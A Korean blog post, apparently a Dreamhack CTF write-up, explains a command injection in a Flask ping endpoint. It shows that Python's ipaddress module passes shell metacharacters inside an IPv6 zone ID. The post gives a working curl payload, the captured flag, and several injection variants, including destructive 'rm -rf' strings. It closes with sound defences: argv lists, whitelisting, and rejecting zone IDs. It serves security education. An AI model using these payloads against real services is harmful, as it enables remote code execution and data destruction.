---
layout: post
title:  "Dreamhack 워게임 EZ_command_injection 풀이 — Python ipaddress 의 IPv6 zone ID 가 통째로 통과시키는 shell metachar"
date:   2026-05-16 15:30:00 +0900
categories: security web wargame dreamhack writeup command-injection python
---

## 들어가며

Dreamhack 웹해킹 워게임 **EZ_command_injection** (난이도 Bronze 1) 풀이입니다. 사이버보안 입문 학생이 자주 마주치는 "**입력을 정상적인 타입으로 한 번 파싱했으니 안전하겠지**" 라는 잘못된 안심을 깨주는 문제입니다.

문제 설명:

> ez command injection chall

스포일러로 결론 — `curl` 한 줄.

```bash
curl -G "$SERVER/ping" --data-urlencode 'host=::%;cat flag.txt;echo'
# → DH{EZZZZZ_COMm4Nd_1nJecTiON_ZzZZ}
```

핵심: **`ipaddress.ip_address('::%X')`** 가 IPv6 zone ID 를 가진 주소로 정상 파싱하고, **`str()`** 으로 다시 원본 문자열을 돌려준다. zone ID (`X` 부분) 안에는 **공백, `;`, `` ` ``, `$()` 등 모든 shell metachar 가 통과**. 그게 그대로 `shell=True` 명령에 박혀 RCE.

> Note: 사이버보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

## 1. 소스 정독

```python
@app.route('/ping', methods=['GET'])
def ping():
    host = request.args.get('host', '')
    try:
        addr = ipaddress.ip_address(host)         # ★ 타입 검증
    except ValueError:
        return render_template('index.html', result='Invalid IP address')

    cmd = f'ping -c 3 {addr}'                      # str(addr) 가 그대로 박힘
    output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=8)
    return render_template('index.html', result=output.decode('utf-8'))
```

코드의 의도:

1. `ipaddress.ip_address(host)` 로 사용자 입력을 정상적인 IP 주소 객체로 파싱. 실패 시 거부 — **이걸 충분한 검증** 으로 가정.
2. 그 결과 객체를 f-string 에 박아 ping 명령 빌드.
3. `/bin/sh -c` 로 실행.

위 가정의 빈틈:

- `ipaddress.ip_address` 는 IPv4 + IPv6 모두 받음.
- IPv6 주소는 **zone ID (scope ID)** 를 가질 수 있다 — `fe80::1%eth0` 형태.
- Python 3.9+ 의 `ipaddress.IPv6Address` 는 zone ID 안의 거의 모든 문자를 **검증 없이 받아들이고 그대로 보존**.
- `str(addr)` 는 zone ID 부분을 그대로 echo.

즉, **타입 검증을 거쳤지만 실제 문자열은 우리 마음대로**.

## 2. ipaddress 의 IPv6 zone ID 실험

```python
>>> import ipaddress
>>> str(ipaddress.ip_address('::%;cat${IFS}flag'))
'::%;cat${IFS}flag'
>>> str(ipaddress.ip_address('::%`id`'))
'::%`id`'
>>> str(ipaddress.ip_address('::%$(whoami)'))
'::%$(whoami)'
>>> str(ipaddress.ip_address('::% ; rm -rf /'))
'::% ; rm -rf /'
```

`%` 뒤에 어떤 shell metachar 든 통과한다. **공백, `;`, `&`, `|`, 백틱, `$()`, `<`, `>` 다 OK**.

이게 의도된 동작이긴 하다 (RFC 6874 는 zone ID 의 문법을 비교적 느슨하게 정의). 그러나 이런 값을 그대로 shell 에 넣는 것은 명백한 보안 실수.

## 3. 페이로드 한 줄

```
host = "::%;cat flag.txt;echo"
```

`ipaddress.ip_address('::%;cat flag.txt;echo')` → IPv6 주소 `::` + scope `;cat flag.txt;echo`. `str(addr)` = `'::%;cat flag.txt;echo'`. f-string 에 박히면:

```
cmd = 'ping -c 3 ::%;cat flag.txt;echo'
```

shell 이 실행:

1. `ping -c 3 ::%` — `::%` 는 ping 입장에선 invalid host, 즉시 실패. 표준 출력에 에러 약간.
2. `;` — 다음 명령으로
3. `cat flag.txt` — flag 내용 출력
4. `;` 
5. `echo` — 빈 줄

`subprocess.check_output` 가 stdout 을 캡쳐 → 응답에 박힘.

```bash
curl -G "$SERVER/ping" --data-urlencode 'host=::%;cat flag.txt;echo'
```

응답에서 `DH{EZZZZZ_COMm4Nd_1nJecTiON_ZzZZ}` ✓

> 작은 디테일: `check_output` 은 returncode != 0 면 `CalledProcessError` 를 던진다. 그러면 우리 출력이 안 보일까? **아니다** — `cat flag.txt; echo` 가 정상 종료 (returncode 0) 라서 check_output 가 성공. 첫 `ping ::%` 가 실패해도 마지막 명령의 returncode 가 전체 결정.

## 4. 다른 통하는 변형

```bash
# 1) backtick 명령 치환
host=::%`cat${IFS}flag.txt`

# 2) $() 명령 치환
host=::%$(cat flag.txt)

# 3) IPv4 broadcast 주소도 OK (마침표만 있으면 IPv4 로 인식, 사실 broadcast 는 . 만 허용)
# IPv4 는 zone ID 가 없어서 metachar 박을 자리 없음. IPv6 만 통하는 트릭.

# 4) IPv6 short form 도 OK
host=fe80::%;rm -rf /tmp/x;cat flag.txt
```

여러 변형 중 첫 번째 (`::%;cat flag.txt;echo`) 가 가장 짧고 명확.

## 5. 취약점 해설 — 타입 검증의 함정

### 5-1. 본 문제의 본질

이 클래스의 본질을 한 줄로:

> **사용자 입력을 "정상 타입" 으로 파싱했다고 해서 그 출력 (`str(obj)`) 이 sanitized 된 것은 아니다.** 파서가 원본 문자열을 보존하는 형태라면, 우리는 그 파서의 "허용된 표기" 범위 내에서 임의의 문자열을 넣을 수 있다.

같은 패턴이 다른 라이브러리에도 흔하다:

- **`json.loads`** : JSON 으로 파싱 가능한 문자열은 다양. 그 안에 unicode escape `<` 같은 게 들어와도 통과.
- **`yaml.safe_load`** : YAML 의 다양한 표기로 같은 값 표현 가능.
- **`urlparse`** : URL 의 일부 필드 (userinfo, fragment) 는 거의 임의 문자.
- **`datetime.fromisoformat`** : 일부 표기에서 timezone 등에 임의 문자 허용.

### 5-2. 같은 클래스의 실무 사례

- **CVE-2017-7805 (Tomcat)** : URL fragment 가 path 에 박혀 traversal.
- **여러 ping/traceroute UI** : `inet_aton` 으로 검증 후 shell 에 박는 패턴 (IPv4 도 `0177.0.0.1` 같은 변형으로 이상한 출력 가능).
- **AWS S3 bucket name validation** 후 그 이름을 shell command 에 박는 케이스 — 일부 변종 가능.
- **Node.js `url.parse`** 의 다양한 quirk 가 path traversal/SSRF 로 이어지는 사례.

### 5-3. 위험성

- 본 문제는 단순 파일 읽기지만, 같은 RCE 로 임의 명령 실행 가능.
- shell metachar 통과의 영향은 **`shell=True` 어디든** 적용. ping 만의 문제가 아니라 file rename, image conversion, log search 등 모든 shell-based 명령.

### 5-4. 올바른 방어

1. **`shell=True` 자체 금지**. argv 리스트로:

   ```python
   subprocess.check_output(['ping', '-c', '3', str(addr)], timeout=8)
   ```

   argv 로 전달하면 ping 의 첫 인자가 `::%;cat flag.txt;echo` 그대로 전달돼 ping 이 "invalid host" 로 거부. shell 평가 자체가 안 일어남.

2. **타입 + 출력 형식 검증 둘 다**. `ipaddress.ip_address` 통과 후 추가로:

   ```python
   import re
   if not re.match(r'^[0-9a-fA-F:.]+$', str(addr)):
       raise ValueError('Suspicious chars')
   ```

3. **명시적으로 zone ID 거부**:

   ```python
   if '%' in str(addr):
       raise ValueError('Scope ID not allowed')
   ```

4. **화이트리스트 형식의 IPv4 만 허용** (대부분의 ping 유틸은 IPv6 가 필요 없다):

   ```python
   addr = ipaddress.IPv4Address(host)   # IPv6 거부
   ```

5. **chroot / seccomp / unprivileged container** 로 RCE 의 영향 최소화.

## 6. 정리 — 입문자가 가져갈 교훈

- **타입 검증 통과 ≠ 문자열 sanitization**. `ipaddress`, `json`, `yaml`, `urlparse` 같은 파서가 검증해주는 것은 "구조 적합성" 일 뿐, 그 안의 모든 문자를 안전하다고 보장하지 않는다.
- IPv6 의 **zone ID (`%...`)** 는 거의 모든 문자를 허용한다. shell command 에 박는 순간 RCE.
- **`shell=True`** 와 사용자 입력 (검증 통과한 입력이라도!) 이 만나면 항상 위험. argv 리스트로 보내는 게 1티어 방어.
- 문자열을 한 번 더 정규식 검증 (`^[0-9a-fA-F:.]+$`) 으로 strict 화이트리스트 적용하면 본 문제는 즉시 방어 가능.

같은 카테고리의 다음 단계로 **Another Ping** (이미 풀음 — `$IFS` + 백틱 트릭), **Blind RCE**, **PHP `escapeshellarg` bypass** 같은 문제를 풀어 보면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. 처음에 IPv4 변형으로 우회 시도

처음 본능적으로 IPv4 표기 변형 (`127.1`, `0x7f000001`, `2130706433`) 으로 시도. 이것들은 valid IPv4 이지만 `str(addr)` 가 항상 정규화된 dotted decimal 로 반환 (`127.0.0.1`, `127.0.0.1`, `127.0.0.1`). 즉 우리 임의 문자가 못 들어감.

해결: **IPv6 + zone ID** 로 발상 전환. IPv6 의 `%scope` 부분이 임의 문자 허용.

**회고**: IP 우회 trick 은 IPv4 와 IPv6 가 완전히 다르다. **IPv4 는 정규화로 거의 다 막힘**, **IPv6 는 zone ID 가 임의 문자 통과**. command injection / SSRF 문제에서 IPv6 zone ID 는 1티어 우회 도구로 기억해두자.

### 실패 2. zone ID 가 어떤 문자까지 허용하는지 미리 확인 안 함

처음에 `::%;cat${IFS}flag` 시도. `${IFS}` 의 `{` `}` 가 ipaddress 에서 거부될 가능성 의심. 확인해보니 통과. (`%` 뒤의 모든 char 가 통과.)

**회고**: ipaddress 의 zone ID 검증 strict 정도를 5초 만에 확인 가능 (`python3 -c 'import ipaddress; print(str(ipaddress.ip_address("::%X")))'`). 페이로드 짜기 전에 검증 함수의 허용 범위부터 측정.

### 실패 3. `check_output` 의 returncode 거부를 잘못 걱정

`subprocess.check_output` 은 returncode != 0 일 때 `CalledProcessError` 던진다. 처음에 "ping 이 invalid host 로 실패하면 check_output 도 실패해서 출력 못 받는 것 아닌가?" 걱정. 그러나 `;` 로 chain 된 다음 명령들의 returncode 가 전체 결정 — 마지막 `echo` 가 0 returncode 라 성공. cat 의 출력이 stdout 에 박혀 응답에 전달.

**회고**: shell 명령 chain 의 returncode 는 마지막 명령의 returncode. `cmd1; cmd2; cmd3` 면 cmd3 의 결과만 매겨짐. `check_output` 가 실패할 걱정이면 `; true` 또는 `; echo` 로 끝내자.

### 실패 4. `flag.txt` 의 위치 확인 안 함

처음에 `cat /flag` 시도 (잘못된 path). 다행히 본 문제는 cwd 가 /app 이라 `cat flag.txt` 가 직접 통한다. Dockerfile/구조 보고 `flag.txt` 만 시도하니 OK.

**회고**: 명령 인젝션 성공 후에는 항상 **상대 경로 (cwd 기준)** 와 **절대 경로 (`/flag.txt`, `/app/flag.txt`)** 두 가지 모두 시도. 먼저 짧은 상대 경로부터.
